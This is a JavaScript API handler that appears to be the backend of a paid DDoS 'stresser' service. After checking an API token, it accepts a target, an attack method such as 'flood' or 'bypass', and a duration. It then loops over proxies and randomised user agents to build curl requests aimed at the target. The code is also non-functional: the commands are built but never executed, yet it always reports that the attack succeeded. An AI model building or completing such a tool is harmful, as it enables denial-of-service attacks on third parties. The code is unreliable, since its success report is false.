import validateToken from "./validateToken";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed." });
  }

  const { token, target, method, duration } = req.body;
  if (!token || !target || !method || !duration) {
    return res.status(400).json({ error: "Missing required fields." });
  }

  // Validate API token
  const isValid = await validateToken(token);
  if (!isValid) {
    return res.status(403).json({ error: "Invalid or expired API token." });
  }

  const methods = ["hold", "bypass", "flood", "tcp_ip", "dsb"];
  if (!methods.includes(method)) {
    return res.status(400).json({ error: "Invalid attack method." });
  }

  const proxies = await fetch("/api/generateProxies").then((res) => res.json());
  const userAgents = generateUserAgents(1000000);

  let successCount = 0;

  for (let i = 0; i < duration; i++) {
    proxies.forEach((proxy) => {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const cmd = `curl --proxy ${proxy} -A "${userAgent}" ${target}`;
      successCount++;
    });
  }

  return res.status(200).json({ message: `Attack sent to ${target} successfully.` });
}

function generateUserAgents(count) {
  const userAgents = [];
  for (let i = 0; i < count; i++) {
    userAgents.push(`Mozilla/5.0 (Windows NT ${Math.random() * 10}) AppleWebKit/537.36`);
  }
  return userAgents;
}
